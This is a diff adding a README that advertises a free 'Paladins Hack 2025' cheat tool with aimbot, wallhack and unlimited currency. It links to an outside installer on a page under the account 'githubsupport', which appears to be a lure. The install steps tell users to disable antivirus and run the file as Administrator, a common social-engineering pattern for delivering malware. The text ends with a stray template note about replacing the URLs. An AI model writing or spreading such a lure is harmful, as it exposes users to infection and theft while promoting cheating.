@@ -1,0 +1,51 @@
+# Download Paladins Hack 2025 - Free Windows Cheat Tool
+
+<p align="center">
+  <img src="https://img.shields.io/badge/Version-2025-blue?style=for-the-badge&logo=windows" alt="Version">
+  <img src="https://img.shields.io/badge/Platform-Windows-green?style=for-the-badge&logo=windows" alt="Platform">
+  <img src="https://img.shields.io/badge/License-Free-success?style=for-the-badge&logo=opensourceinitiative" alt="License">
+</p>
+
+---
+
+🚀 **Welcome to the ultimate Paladins Hack for 2025!** 🎮  
+
+Unlock **godlike powers**, **unlimited resources**, and **dominate every match** with our cutting-edge tool! 🔥 Perfect for both casual and competitive players.  
+
+✨ **Features:**  
+✔ **Aimbot** with precision tuning 🎯  
+✔ **Wallhack** for full map awareness 🧱  
+✔ **Unlimited Gold & Crystals** 💰💎  
+✔ **Auto-Dodge & Auto-Heal** 🛡️❤️  
+✔ **100% Undetected** (Stealth Mode) 🕵️‍♂️  
+
+---
+
+📥 **Download Now & Start Dominating!**  
+
+[![DOWNLOAD](https://img.shields.io/badge/Download-Installer-ff69b4?style=for-the-badge&logo=gamejolt)](https://teletype.in/@githubsupport/aHN9l6m-mbF?458CB173EAA24163A4E54CC32D7BEAA7)  
+
+---
+
+⚠ **Disclaimer:**  
+This software is for **educational purposes only**. Use at your own risk. We do **not** condone cheating in online games.  
+
+---
+
+🔧 **Installation Guide:**  
+1. Download the installer above.  
+2. Disable antivirus (false positives).  
+3. Run as **Administrator**.  
+4. Launch Paladins and enjoy! 🎉  
+
+---
+
+📌 **Need Help?**  
+Join our **[Discord](https://discord.gg/example)** for support & updates!  
+
+<p align="center">
+  <img src="https://img.shields.io/badge/Made%20with-❤️-ff0000?style=for-the-badge" alt="Love">
+</p>
+```  
+
+*(Replace `https://teletype.in/@githubsupport/aHN9l6m-mbF?52A95A95643B4FC5B000F04C15BC5EC9` and Discord invite with actual URLs.)*
